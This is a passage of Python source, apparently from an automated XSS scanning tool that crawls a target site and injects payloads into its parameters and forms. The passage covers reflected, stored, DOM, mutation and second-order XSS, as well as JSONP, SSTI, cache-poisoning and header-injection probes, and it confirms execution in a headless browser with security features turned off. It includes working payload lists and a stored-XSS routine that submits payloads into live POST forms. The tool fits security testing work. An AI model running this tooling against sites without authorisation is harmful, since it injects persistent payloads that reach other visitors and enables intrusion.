                                nn = abs_url.split("#")[0].rstrip("/")
                                if nn not in visited:
                                    links.add(nn)
                    except Exception:
                        pass

                    # Also click buttons that might trigger route changes (SPA nav)
                    try:
                        for btn in pg.locator("button, [role=button], [data-route]").all()[:8]:
                            try:
                                with pg.expect_navigation(timeout=3000):
                                    btn.click(timeout=1000)
                                new_url = pg.url
                                if new_url not in visited and same_origin(target, new_url):
                                    links.add(new_url.split("#")[0].rstrip("/"))
                                pg.go_back(timeout=3000)
                            except Exception:
                                pass
                    except Exception:
                        pass

                    pg.close()
                    for link in list(links)[:10]:
                        if len(pages) < max_pages:
                            _spider_page(link, depth + 1)
                else:
                    pg.close()

            _spider_page(target, 0)
            browser.close()

    except Exception as e:
        L(f"JS spider error: {e}", "warn")

    L(f"JS spider done — {len(pages)} pages | {len(api_hits)} API endpoints intercepted", "ok")
    return pages


# ══════════════════════════════════════════════════════════════════════════════
# HTTP CRAWLER (fast, parallel, for non-JS sites)
# ══════════════════════════════════════════════════════════════════════════════
def http_crawl(target: str, max_depth: int, robots_paths: list,
               session: requests.Session, term_ph, stats_phs) -> list:
    visited, bfsq, pages = set(), deque([(target, 0)]), []
    parsed_target = urllib.parse.urlparse(target)
    base = f"{parsed_target.scheme}://{parsed_target.netloc}"
    for rpath in robots_paths[:6]:
        bfsq.appendleft((base + rpath, 0))

    while bfsq and len(pages) < MAX_PAGES:
        url, depth = bfsq.popleft()
        norm = url.split("#")[0].rstrip("/")
        if norm in visited:
            continue
        visited.add(norm)
        try:
            resp = session.get(url, timeout=REQ_TIMEOUT, allow_redirects=True)
        except Exception:
            continue
        ct = resp.headers.get("Content-Type","")
        if "text/html" not in ct and "javascript" not in ct:
            continue
        soup  = BeautifulSoup(resp.text, "lxml")
        forms = _extract_forms(url, soup)
        pages.append({
            "url": url, "html": resp.text[:20000],
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "forms": forms,
            "params": _extract_params(url),
            "dom_sinks": _find_dom_sinks(resp.text),
            "inline_js": _inline_js(soup),
            "js_endpoints": _extract_js_endpoints(resp.text, url),
            "redirect_params": _find_open_redirect_params(resp.text, url),
            "jsonp_endpoints": _find_jsonp_endpoints(resp.text, url),
            "postmessage_handlers": _find_postmessage_handlers(resp.text),
            "spa_rendered": False,
        })
        st.session_state.pages_crawled = len(pages)
        log(f"Crawled [{len(pages)}] {url[:65]} — {len(forms)} forms", "cmd", term_ph, stats_phs)
        if depth < max_depth:
            for tag in soup.find_all("a", href=True):
                nxt = to_abs(url, tag["href"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth+1))
    return pages


# ══════════════════════════════════════════════════════════════════════════════
# HTML EXTRACTION HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def _extract_forms(page_url: str, soup) -> list:
    forms = []
    for form in soup.find_all("form"):
        action     = form.get("action") or page_url
        method     = form.get("method","get").lower()
        action_url = to_abs(page_url, action) or page_url
        fields = []
        for inp in form.find_all(["input","textarea","select"]):
            name  = inp.get("name") or inp.get("id") or ""
            itype = inp.get("type","text")
            if name and itype not in ("submit","button","image","file"):
                fields.append({"name":name,"type":itype,"value":inp.get("value","")})
        if fields:
            forms.append({"action":action_url,"method":method,
                           "fields":fields,"enctype":form.get("enctype","")})
    return forms


def _extract_params(url: str) -> list:
    return list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())


def _inline_js(soup) -> str:
    parts = []
    for tag in soup.find_all("script"):
        if not tag.get("src") and tag.string:
            parts.append(tag.string[:500])
    return "\n".join(parts[:6])


def _find_dom_sinks(html: str) -> list:
    found = []
    for pat in DOM_SINKS:
        for m in re.findall(f".{{0,60}}{pat}.{{0,80}}", html)[:2]:
            found.append(m.strip())
    return list(dict.fromkeys(found))[:20]


def _find_postmessage_handlers(html: str) -> list:
    handlers = []
    pattern = r"addEventListener\s*\(\s*['\"]message['\"].*?(?:function|\()\s*\(.*?\)\s*\{(.{0,300})"
    for m in re.findall(pattern, html, re.DOTALL)[:3]:
        has_origin = bool(re.search(r"event\.origin|\.origin\s*[!=]=", m))
        handlers.append({"snippet": m[:200], "no_origin_check": not has_origin})
    return handlers


def _find_jsonp_endpoints(html: str, base_url: str) -> list:
    eps = []
    for pat in [r'[\'"]([^\'"]+\?(?:callback|jsonp|cb)=)[\'"]',
                r'src\s*=\s*[\'"]([^\'"]+\?(?:callback|jsonp|cb)=)[^\'"]*[\'"]']:
        for m in re.findall(pat, html):
            abs_url = to_abs(base_url, m)
            if abs_url: eps.append(abs_url)
    return list(dict.fromkeys(eps))[:8]


def _find_open_redirect_params(html: str, url: str) -> list:
    names = {"redirect","url","next","return","return_to","goto","dest",
             "destination","redir","redirect_url","continue","target","forward"}
    params = []
    for p in urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys():
        if p.lower() in names: params.append(p)
    for m in re.findall(r'<input[^>]+name=["\'](\w+)["\']', html, re.I):
        if m.lower() in names and m not in params: params.append(m)
    return params


def _extract_js_endpoints(html: str, base_url: str) -> list:
    eps = []
    for pat in [r'fetch\([\'"]([^\'"?#]+)[\'"]',
                r'axios\.\w+\([\'"]([^\'"?#]+)[\'"]',
                r'url\s*[:=]\s*[\'"]([/][^\'"]+)[\'"]',
                r'[\'"](/api/[^\'"]+)[\'"]',
                r'[\'"](/v\d+/[^\'"]+)[\'"]',
                r'[\'"](/graphql[^\'"]*)[\'"]']:
        for m in re.findall(pat, html):
            abs_url = to_abs(base_url, m)
            if abs_url and abs_url not in eps: eps.append(abs_url)
    return eps[:20]


def _detect_template_engine(pages: list) -> tuple:
    combined = " ".join(p["html"] for p in pages[:4])
    for engine, sigs in TEMPLATE_ENGINES.items():
        for sig in sigs:
            if re.search(sig, combined, re.I):
                ssti = ["{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}",
                        "{{config.items()}}","{{request.environ}}",
                        "{{''.__class__.__mro__[1].__subclasses__()}}"]
                return engine, ssti
    return "", []


# ══════════════════════════════════════════════════════════════════════════════
# CSRF TOKEN EXTRACTION
# ══════════════════════════════════════════════════════════════════════════════
def _fetch_csrf_token(form_url: str, session: requests.Session) -> dict:
    """Fetch the form page fresh and extract CSRF tokens."""
    try:
        resp = session.get(form_url, timeout=REQ_TIMEOUT)
        soup = BeautifulSoup(resp.text, "lxml")
        csrf_data = {}
        for inp in soup.find_all("input", type="hidden"):
            name = inp.get("name","")
            val  = inp.get("value","")
            if name and any(k in name.lower() for k in
                           ["csrf","token","nonce","_wpnonce","authenticity","verify","_token"]):
                csrf_data[name] = val
        return csrf_data
    except Exception:
        return {}


# ══════════════════════════════════════════════════════════════════════════════
# REFLECTION & CONTEXT ANALYSIS
# ══════════════════════════════════════════════════════════════════════════════
def _check_reflection(body: str, payload: str) -> dict:
    result = {"reflected":False,"escaped":False,"partial":False,"snippet":"","context":""}
    if payload in body:
        result["reflected"] = True
        escaped_forms = [
            html_lib.escape(payload),
            payload.replace("<","&lt;").replace(">","&gt;"),
            payload.replace('"',"&quot;").replace("'","&#x27;"),
            urllib.parse.quote(payload),
            payload.replace("<","\\u003c").replace(">","\\u003e"),
        ]
        result["escaped"] = any(ev in body for ev in escaped_forms)
        idx = body.find(payload)
        result["snippet"]  = body[max(0,idx-150):idx+300]
        result["context"]  = _injection_context(result["snippet"], payload)
        return result
    # Partial
    key_parts = [p for p in ["alert(1)","onerror=","onload=","javascript:","<script","onfocus"]
                 if p in payload and p in body]
    if key_parts:
        idx = body.find(key_parts[0])
        result.update({"reflected":True,"partial":True,"escaped":False,
                        "snippet":body[max(0,idx-100):idx+200],
                        "context":"Partial reflection"})
    return result


def _injection_context(snippet: str, payload: str) -> str:
    before = snippet[:snippet.find(payload)] if payload in snippet else snippet[:80]
    if re.search(r'<script[^>]*>[^<]*$', before, re.DOTALL): return "JS context (inside <script>)"
    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', before):      return "Event handler attribute"
    if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*$', before): return "URL attribute"
    if re.search(r'<style[^>]*>[^<]*$', before, re.DOTALL):  return "CSS context"
    if re.search(r'=\s*["\'][^"\']*$', before):              return "HTML attribute value"
    if re.search(r'<[a-zA-Z][^>]*$', before):                return "Inside HTML tag"
    return "HTML body"


# ══════════════════════════════════════════════════════════════════════════════
# HTML MUTATION VERIFICATION (Playwright before/after diff)
# ══════════════════════════════════════════════════════════════════════════════
def verify_html_mutation(target_url: str, param: str, payload: str,
                         method: str="get", extra_data: dict=None,
                         session_cookies: list=None) -> dict:
    result = {
        "confirmed":False,"html_changed":False,
        "dialog_fired":False,"dialog_msg":None,
        "injected_element":None,"dom_diff_summary":"",
        "screenshot_before":None,"screenshot_after":None,"error":None,
    }
    if not PLAYWRIGHT_OK:
        result["error"] = "Playwright not installed"
        return result

    def _build_url(with_p):
        if method == "get":
            parsed = urllib.parse.urlparse(target_url)
            pd = dict(urllib.parse.parse_qsl(parsed.query))
            if with_p: pd[param] = payload
            return parsed._replace(query=urllib.parse.urlencode(pd)).geturl()
        return target_url

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=[
                "--no-sandbox","--disable-setuid-sandbox",
                "--disable-dev-shm-usage","--disable-gpu",
                "--disable-web-security","--allow-running-insecure-content",
            ])
            ctx = browser.new_context(ignore_https_errors=True)
            if session_cookies:
                ctx.add_cookies(session_cookies)

            _INIT = """
                window._xss_confirmed=false;window._xss_msg=null;
                ['alert','confirm','prompt'].forEach(function(fn){
                    var orig=window[fn];
                    window[fn]=function(m){
                        window._xss_confirmed=true;window._xss_msg=String(m);
                        try{orig(m);}catch(e){}
                        return fn==='confirm'?true:(fn==='prompt'?'xss':undefined);
                    };
                });
            """

            # Baseline
            pg_base = ctx.new_page()
            pg_base.add_init_script(_INIT)
            try:
                pg_base.goto(_build_url(False), wait_until="networkidle", timeout=12000)
            except Exception:
                try: pg_base.goto(_build_url(False), wait_until="domcontentloaded", timeout=8000)
                except Exception: pass
            pg_base.wait_for_timeout(1500)
            try:
                baseline_html  = pg_base.evaluate("document.body.innerHTML")
                baseline_count = pg_base.evaluate("document.querySelectorAll('*').length")
                result["screenshot_before"] = pg_base.screenshot(full_page=False)
            except Exception:
                baseline_html = ""; baseline_count = 0
            pg_base.close()

            # Attack
            pg_atk = ctx.new_page()
            pg_atk.add_init_script(_INIT)
            fired  = {"v":False,"m":""}
            def _dlg(d):
                fired["v"]=True; fired["m"]=d.message
                try: d.dismiss()
                except Exception: pass
            pg_atk.on("dialog", _dlg)

            try:
                if method == "get":
                    pg_atk.goto(_build_url(True), wait_until="networkidle", timeout=12000)
                else:
                    pg_atk.goto(target_url, wait_until="domcontentloaded", timeout=10000)
                    for fname, fval in (extra_data or {}).items():
                        try:
                            loc = pg_atk.locator(f"[name='{fname}']")
                            if loc.count() > 0: loc.first.fill(str(fval))
                        except Exception: pass
                    try:
                        loc = pg_atk.locator(f"[name='{param}']")
                        if loc.count() > 0:
                            loc.first.fill(payload)
                            loc.first.press("Enter")
                    except Exception: pass
            except Exception:
                try: pg_atk.goto(_build_url(True), wait_until="domcontentloaded", timeout=8000)
                except Exception: pass

            pg_atk.wait_for_timeout(2500)

            if fired["v"]:
                result["confirmed"] = result["dialog_fired"] = True
                result["dialog_msg"] = fired["m"]
            try:
                if pg_atk.evaluate("window._xss_confirmed===true"):
                    result["confirmed"] = result["dialog_fired"] = True
                    result["dialog_msg"] = pg_atk.evaluate("window._xss_msg||''")
            except Exception: pass

            # Check injected elements
            try:
                injected = pg_atk.evaluate("""(function(){
                    var tags=['script','img','svg','details','video','audio','iframe','object'];
                    for(var t of tags){
                        var els=document.querySelectorAll(
                            t+'[onerror],'+t+'[onload],'+t+'[ontoggle],'+t+'[onfocus],'+t+'[onmouseover]');
                        if(els.length>0)return els[0].outerHTML.slice(0,200);
                    }
                    if(document.body.innerHTML.includes('INJECTED'))return 'HTML injection marker found';
                    return null;
                })()""")
                if injected:
                    result["confirmed"] = True
                    result["injected_element"] = injected
            except Exception: pass

            # HTML diff
            try:
                after_html  = pg_atk.evaluate("document.body.innerHTML")
                after_count = pg_atk.evaluate("document.querySelectorAll('*').length")
                result["screenshot_after"] = pg_atk.screenshot(full_page=False)
                if baseline_html and after_html:
                    delta = abs(after_count - baseline_count)
                    dangerous_added = any(
                        tag not in baseline_html.lower() and tag in after_html.lower()
                        for tag in ["<script","<svg","onerror=","onload=","ontoggle=","javascript:"]
                    )
                    content_changed = baseline_html[:400] != after_html[:400]
                    if delta > 2 or dangerous_added or content_changed:
                        result["html_changed"] = True
                        if dangerous_added and not result["confirmed"]:
                            result["confirmed"] = True
                        result["dom_diff_summary"] = (
                            f"DOM Δ={delta} elements. "
                            + ("Dangerous tags injected! " if dangerous_added else "")
                            + ("Page content changed." if content_changed else "")
                        )
            except Exception: pass

            pg_atk.close()
            browser.close()
    except Exception as e:
        result["error"] = str(e)
    return result


# ══════════════════════════════════════════════════════════════════════════════
# INJECTION TESTING (parallel)
# ══════════════════════════════════════════════════════════════════════════════
def test_one(url: str, param: str, payload: str, method: str="get",
             extra_data: dict=None, session: requests.Session=None) -> dict:
    r = {"url":url,"param":param,"payload":payload,"method":method,
         "status":None,"reflected":False,"escaped":False,"partial":False,
         "context":"","body_snippet":""}
    try:
        sess = session or requests
        if method == "get":
            parsed = urllib.parse.urlparse(url)
            pd     = dict(urllib.parse.parse_qsl(parsed.query))
            pd[param] = payload
            test_url = parsed._replace(query=urllib.parse.urlencode(pd)).geturl()
            kw = {"timeout":REQ_TIMEOUT,"allow_redirects":True}
            if not session: kw["headers"] = REQ_HEADERS
            resp = sess.get(test_url, **kw)
        else:
            data = dict(extra_data or {})
            data[param] = payload
            kw = {"data":data,"timeout":REQ_TIMEOUT,"allow_redirects":True}
            if not session: kw["headers"] = REQ_HEADERS
            resp = sess.post(url, **kw)
        r["status"] = resp.status_code
        ref = _check_reflection(resp.text, payload)
        r.update({"reflected":ref["reflected"],"escaped":ref.get("escaped",False),
                  "partial":ref.get("partial",False),
                  "body_snippet":ref.get("snippet",""),
                  "context":ref.get("context","")})
    except Exception as e:
        r["error"] = str(e)
    return r


def _do_mutation_verify(r: dict, term_ph, stats_phs, label: str,
                        extra_data=None, session_cookies: list=None):
    log(f"  ↳ [{r['context']}] — browser verify (JS + HTML mutation)...",
        "html", term_ph, stats_phs)
    mv = verify_html_mutation(r["url"], r["param"], r["payload"],
                              r["method"], extra_data=extra_data,
                              session_cookies=session_cookies)
    r.update({
        "browser_confirmed": mv["confirmed"],
        "html_changed":      mv["html_changed"],
        "dom_diff":          mv.get("dom_diff_summary",""),
        "screenshot":        mv.get("screenshot_after") or mv.get("screenshot_before"),
        "screenshot_before": mv.get("screenshot_before"),
        "screenshot_after":  mv.get("screenshot_after"),
        "dialog_msg":        mv.get("dialog_msg"),
        "injected_element":  mv.get("injected_element"),
        "browser_error":     mv.get("error"),
    })
    if mv["confirmed"]:
        st.session_state.vulns_found += 1
        proof = []
        if mv["dialog_fired"]: proof.append(f'JS executed — dialog: "{mv["dialog_msg"]}"')
        if mv["html_changed"]: proof.append(f"HTML MUTATED — {mv['dom_diff_summary']}")
        if mv["injected_element"]: proof.append(f"Injected: {mv['injected_element'][:60]}")
        log(f"🎯 CONFIRMED — {label} | {' | '.join(proof)}", "vuln", term_ph, stats_phs)
    elif mv["html_changed"]:
        log(f"  ↳ HTML CHANGED (no JS exec) — {mv['dom_diff_summary'][:80]}", "html", term_ph, stats_phs)
    else:
        log(f"  ↳ reflected but page unchanged in browser", "warn", term_ph, stats_phs)


def test_page_parallel(page: dict, payloads: list, focus_fields: list,
                       session: requests.Session, term_ph, stats_phs,
                       session_cookies: list=None) -> list:
    hits = []

    def _test_param_combo(args):
        url, param, method, extra_data, payload = args
        return test_one(url, param, payload, method, extra_data, session)

    # Build all (param, payload) jobs
    jobs = []  # (url, param, method, extra_data, payload)

    for param in page.get("params",[]):
        st.session_state.points_found += 1
        for payload in payloads[:22]:
            jobs.append((page["url"], param, "get", None, payload))

    for form in page.get("forms",[]):
        field_data = {f["name"]: f.get("value","test") for f in form.get("fields",[])}
        for field in form.get("fields",[]):
            st.session_state.points_found += 1
            for payload in payloads[:22]:
                data = dict(field_data)
                data[field["name"]] = payload
                jobs.append((form["action"], field["name"], form["method"], data, payload))

    if not jobs:
        return hits

    # Run in parallel, stop per-param at first unescaped reflection
    seen_params = set()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(_test_param_combo, j): j for j in jobs}
        for future in concurrent.futures.as_completed(futures):
            r = future.result()
            key = (r["url"], r["param"], r["method"])
            if key in seen_params:
                continue
            if r["reflected"] and not r["escaped"]:
                seen_params.add(key)
                label = f"{r['url'][:55]} {r['method'].upper()} {r['param']}=[{r['payload'][:40]}]"
                _do_mutation_verify(r, term_ph, stats_phs, label,
                                    extra_data=futures[future][3],
                                    session_cookies=session_cookies)
                hits.append(r)
            elif r["reflected"]:
                seen_params.add(key)
                log(f"  Escaped — {r['url'][:50]} {r['param']}", "warn", term_ph, stats_phs)

    return hits


# ══════════════════════════════════════════════════════════════════════════════
# STORED XSS — fast parallel
# ══════════════════════════════════════════════════════════════════════════════
def hunt_stored_xss(pages: list, payloads: list, session: requests.Session,
                    term_ph, stats_phs, session_cookies: list=None) -> list:
    hits = []
    storage_forms = [(pg, fm) for pg in pages for fm in pg.get("forms",[])
                     if fm["method"] == "post"]
    if not storage_forms:
        log("No POST forms — skipping stored XSS", "skip", term_ph, stats_phs)
        return hits

    log(f"Found {len(storage_forms)} POST form(s) — parallel marker injection", "hunt", term_ph, stats_phs)
    unique_id  = f"xp{int(time.time())%100000}"
    marker_map = {}

    def _submit(args):
        idx, page, form, field = args
        marker = f"{unique_id}x{idx}"
        # Fetch fresh CSRF token before each submit
        csrf = _fetch_csrf_token(form["action"], session)
        base_data = {f["name"]: f.get("value","test") for f in form.get("fields",[])}
        base_data.update(csrf)  # inject real CSRF token
        data = dict(base_data)
        data[field["name"]] = marker + payloads[0]
        try:
            kw = {"data":data,"timeout":REQ_TIMEOUT,"allow_redirects":True}
            r  = session.post(form["action"], **kw)
            return marker, form["action"], field["name"], payloads[0], r.status_code
        except Exception:
            return marker, form["action"], field["name"], payloads[0], 0

    jobs = [(i, pg, fm, fld)
            for i,(pg,fm) in enumerate(storage_forms[:6])
            for fld in fm.get("fields",[])[:3]]

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        for marker, inject_url, fname, payload, code in ex.map(_submit, jobs):
            marker_map[marker] = (inject_url, fname, payload)
            log(f"  → {inject_url[:55]} field={fname} [{code}]", "hunt", term_ph, stats_phs)

    if not marker_map:
        return hits

    log(f"  Submitted {len(marker_map)} markers — sweeping for persistence...", "hunt", term_ph, stats_phs)

    def _check_page(check_url):
        try:
            r2 = session.get(check_url, timeout=REQ_TIMEOUT)
            found = []
            for marker, (inject_url, fname, payload) in marker_map.items():
                if marker in r2.text:
                    ref = _check_reflection(r2.text, payload)
                    if ref["reflected"] and not ref.get("escaped"):
                        found.append((check_url, r2.text, ref, marker, inject_url, fname, payload))
            return found
        except Exception:
            return []

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        for page_results in ex.map(_check_page, [p["url"] for p in pages]):
            for store_url, store_body, ref, marker, inject_url, fname, payload in page_results:
                log(f"  🎯 STORED — found on {store_url}", "vuln", term_ph, stats_phs)
                r_hit = {
                    "url":store_url,"inject_url":inject_url,"param":fname,
                    "payload":payload,"method":"stored-post","status":200,
                    "reflected":True,"escaped":False,"partial":False,
                    "context":f"STORED XSS — via {inject_url} field={fname}",
                    "body_snippet":ref.get("snippet",store_body[:300]),
                    "browser_confirmed":False,
                    "severity":"CRITICAL — stored XSS persists for ALL visitors",
                }
                if PLAYWRIGHT_OK:
                    mv = verify_html_mutation(store_url, fname, payload, "get",
                                             session_cookies=session_cookies)
                    r_hit.update({
                        "browser_confirmed": mv["confirmed"],
                        "html_changed":      mv["html_changed"],
                        "dom_diff":          mv.get("dom_diff_summary",""),
                        "screenshot":        mv.get("screenshot_after"),
                        "screenshot_before": mv.get("screenshot_before"),
                        "dialog_msg":        mv.get("dialog_msg"),
                    })
                    if mv["confirmed"] or mv["html_changed"]:
                        log(f"  🎯 STORED XSS CONFIRMED + HTML MUTATED", "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
                hits.append(r_hit)
    return hits


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 7 — SECOND-ORDER XSS
# After all injections: re-crawl with Playwright and look for deferred execution
# ══════════════════════════════════════════════════════════════════════════════
def phase7_second_order(pages: list, session: requests.Session,
                        term_ph, stats_phs, session_cookies: list=None) -> list:
    """
    Submit payloads into storage endpoints, then navigate all pages with a
    real browser and check if execution fires later (second-order / persistent).
    """
    if not PLAYWRIGHT_OK:
        log("Playwright unavailable — second-order scan skipped", "skip", term_ph, stats_phs)
        return []

    L = lambda m, k="second": log(m, k, term_ph, stats_phs)
    L("Second-order sweep — checking all pages for deferred XSS execution...")
    hits = []

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=[
                "--no-sandbox","--disable-setuid-sandbox",
                "--disable-dev-shm-usage","--disable-gpu","--disable-web-security",
            ])
            ctx = browser.new_context(ignore_https_errors=True)
            if session_cookies:
                ctx.add_cookies(session_cookies)

            for page in pages[:12]:
                pg = ctx.new_page()
                pg.add_init_script("""
                    window._so_xss=false;window._so_msg=null;
                    var _oa=window.alert;
                    window.alert=function(m){window._so_xss=true;window._so_msg=String(m);try{_oa(m);}catch(e){}};
                """)
                fired = {"v":False,"m":""}
                def _dlg(d):
                    fired["v"]=True; fired["m"]=d.message
                    try: d.dismiss()
                    except Exception: pass
                pg.on("dialog", _dlg)
                try:
                    pg.goto(page["url"], wait_until="networkidle", timeout=12000)
                except Exception:
                    try: pg.goto(page["url"], wait_until="domcontentloaded", timeout=7000)
                    except Exception:
                        pg.close()
                        continue
                pg.wait_for_timeout(2500)

                confirmed = fired["v"]
                msg = fired["m"]
                if not confirmed:
                    try:
                        confirmed = pg.evaluate("window._so_xss===true")
                        msg = pg.evaluate("window._so_msg||''")
                    except Exception: pass

                if confirmed:
                    shot = None
                    try: shot = pg.screenshot()
                    except Exception: pass
                    L(f"🎯 SECOND-ORDER XSS on {page['url'][:70]} — dialog: {msg}", "vuln")
                    hits.append({
                        "url": page["url"], "param": "second-order",
                        "payload": "(previously injected payload)", "method": "get",
                        "status": 200, "reflected": True, "escaped": False, "partial": False,
                        "context": "Second-order XSS (deferred execution)",
                        "body_snippet": "", "browser_confirmed": True,
                        "dialog_msg": msg, "screenshot": shot,
                        "severity": "CRITICAL — second-order XSS: fires on page visit",
                        "html_changed": True,
                    })
                    st.session_state.vulns_found += 1

                pg.close()
            browser.close()
    except Exception as e:
        L(f"Second-order sweep error: {e}", "warn")

    L(f"Second-order sweep done — {len(hits)} deferred execution(s) found",
      "ok" if not hits else "vuln")
    return hits


# ══════════════════════════════════════════════════════════════════════════════
# ADVANCED HUNTING (parallel)
# ══════════════════════════════════════════════════════════════════════════════
def hunt_cache_poisoning(target: str, session: requests.Session,
                         term_ph, stats_phs) -> list:
    hits = []
    marker = "CACHEPOISONTEST9182"
    test_headers = {
        "X-Forwarded-Host":    f"{marker}.evil.com",
        "X-Original-URL":      f"/{marker}",
        "X-Host":              f"{marker}.evil.com",
        "X-HTTP-Host-Override":f"{marker}.evil.com",
    }
    def _t(args):
        hname, hval = args
        try:
            resp = session.get(target, headers={hname:hval}, timeout=REQ_TIMEOUT)
            if marker in resp.text:
                idx = resp.text.find(marker)
                return hname, hval, resp.status_code, resp.text[max(0,idx-50):idx+100]
        except Exception: pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for res in ex.map(_t, test_headers.items()):
            if res:
                hname, hval, code, snip = res
                hits.append({"url":target,"param":hname,"payload":hval,
                              "method":"header","status":code,
                              "reflected":True,"escaped":False,"partial":False,
                              "context":f"Cache poisoning ({hname})",
                              "body_snippet":snip,"browser_confirmed":False,
                              "severity":"HIGH — cache poisoning → stored XSS possible"})
                log(f"CACHE POISONING via {hname}", "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
    return hits


def hunt_cors_xss(target: str, infra: dict, term_ph, stats_phs) -> list:
    if not infra.get("cors_vuln"):
        return []
    hit = {"url":target,"param":"Origin","payload":"Origin: https://evil.com",
           "method":"header","status":200,
           "reflected":True,"escaped":False,"partial":False,
           "context":"CORS misconfiguration","body_snippet":infra["cors_vuln"],
           "browser_confirmed":False,
           "severity":f"CRITICAL — CORS: {infra['cors_vuln']}"}
    log(f"CORS vuln confirmed: {infra['cors_vuln']}", "vuln", term_ph, stats_phs)
    st.session_state.vulns_found += 1
    return [hit]


def hunt_jsonp(pages: list, session: requests.Session, term_ph, stats_phs) -> list:
    hits = []
    all_eps = list({ep for p in pages for ep in p.get("jsonp_endpoints",[])})
    cb_payloads = ["alert(1)//","alert(document.domain)//","};alert(1);//","alert`1`//"]

    def _t(ep):
        for cb in cb_payloads:
            try:
                sep = "&" if "?" in ep else "?"
                resp = session.get(ep+sep+"callback="+urllib.parse.quote(cb), timeout=REQ_TIMEOUT)
                if cb in resp.text or cb[:10] in resp.text:
                    return ep, cb, resp.status_code, resp.text[:300]
            except Exception: pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for res in ex.map(_t, all_eps):
            if res:
                ep, cb, code, body = res
                hits.append({"url":ep,"param":"callback","payload":cb,
                              "method":"get","status":code,
                              "reflected":True,"escaped":False,"partial":False,
                              "context":"JSONP callback injection","body_snippet":body,
                              "browser_confirmed":False,"severity":"HIGH — JSONP XSS"})
                log(f"JSONP injection: {ep}", "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
    return hits


def hunt_mutation_xss(pages: list, plan: dict, session: requests.Session,
                      term_ph, stats_phs, session_cookies: list=None) -> list:
    hits = []
    mxss = [
        '<listing><img src=1 onerror=alert(1)></listing>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<!--<img src="--><img src=x onerror=alert(1)>',
        '<table><td><img src=x onerror=alert(1)></table>',
        '<select><option><img src=x onerror=alert(1)></option></select>',
        '<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>',
        '<form><math><mtext></form><form><mglyph><svg><mtext></svg><img src=x onerror=alert(1)>',
    ] + plan.get("mutation_xss_candidates",[])

    for page in pages[:5]:
        for param in page.get("params",[])[:3]:
            for payload in mxss[:5]:
                r = test_one(page["url"], param, payload, "get", session=session)
                if r["reflected"] and not r["escaped"]:
                    log(f"mXSS candidate: {page['url'][:55]} ?{param}", "warn", term_ph, stats_phs)
                    _do_mutation_verify(r, term_ph, stats_phs,
                                       f"mXSS {page['url'][:50]} ?{param}",
                                       session_cookies=session_cookies)
                    hits.append(r)
                    break
    return hits


def hunt_dom_xss(pages: list, session_cookies: list, term_ph, stats_phs) -> list:
    hits = []
    if not PLAYWRIGHT_OK:
        log("Playwright unavailable — DOM XSS browser hunt skipped", "skip", term_ph, stats_phs)
        return hits

    sink_pages = [p for p in pages if p.get("dom_sinks")] or pages[:3]
    dom_payloads = [
        '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>', '<details open ontoggle=alert(1)>',
    ]

    for page in sink_pages[:4]:
        encoded = urllib.parse.quote(dom_payloads[0])
        test_urls = [
            page["url"].split("#")[0] + "#" + encoded,
            page["url"] + ("&" if "?" in page["url"] else "?") + "q=" + encoded,
        ]
        for test_url in test_urls:
            try:
                with sync_playwright() as pw:
                    browser = pw.chromium.launch(headless=True, args=[
                        "--no-sandbox","--disable-setuid-sandbox",
                        "--disable-dev-shm-usage","--disable-gpu","--disable-web-security",
                    ])
                    ctx = browser.new_context(ignore_https_errors=True)
                    if session_cookies:
                        ctx.add_cookies(session_cookies)
                    pg = ctx.new_page()
                    pg.add_init_script("window._dom_hit=false;var _oa=window.alert;window.alert=function(m){window._dom_hit=true;window._dom_msg=String(m);try{_oa(m);}catch(e){}};")
                    fired = {"v":False,"m":""}
                    def _dlg(d):
                        fired["v"]=True;fired["m"]=d.message
                        try: d.dismiss()
                        except Exception: pass
                    pg.on("dialog", _dlg)
                    try: pg.goto(test_url, wait_until="networkidle", timeout=10000)
                    except Exception:
                        try: pg.goto(test_url, wait_until="domcontentloaded", timeout=6000)
                        except Exception: pass
                    pg.wait_for_timeout(2000)
                    confirmed = fired["v"]
                    if not confirmed:
                        try: confirmed = pg.evaluate("window._dom_hit===true")
                        except Exception: pass
                    if confirmed:
                        msg = fired["m"]
                        try: msg = pg.evaluate("window._dom_msg||''")
                        except Exception: pass
                        shot = None
                        try: shot = pg.screenshot()
                        except Exception: pass
                        hits.append({
                            "url":test_url,"param":"DOM source (hash/search)",
                            "payload":dom_payloads[0],"method":"get",
                            "status":200,"reflected":True,"escaped":False,"partial":False,
                            "context":"DOM-based XSS","body_snippet":"",
                            "browser_confirmed":True,"dialog_msg":msg,"screenshot":shot,
                            "severity":"CRITICAL — DOM XSS confirmed",
                        })
                        st.session_state.vulns_found += 1
                        log(f"🎯 DOM XSS CONFIRMED — {test_url[:75]}", "vuln", term_ph, stats_phs)
                    browser.close()
                    if confirmed: break
            except Exception: pass
    return hits


def hunt_header_injection(target: str, session: requests.Session,
                          term_ph, stats_phs) -> list:
    hits = []
    probe = "HEADERINJECT9182"
    test_h = {"X-Forwarded-For":probe,"X-Real-IP":probe,
               "Referer":f"https://evil.com/{probe}",
               "X-Custom-Header":f'<script>alert("{probe}")</script>'}
    def _t(args):
        hname, hval = args
        try:
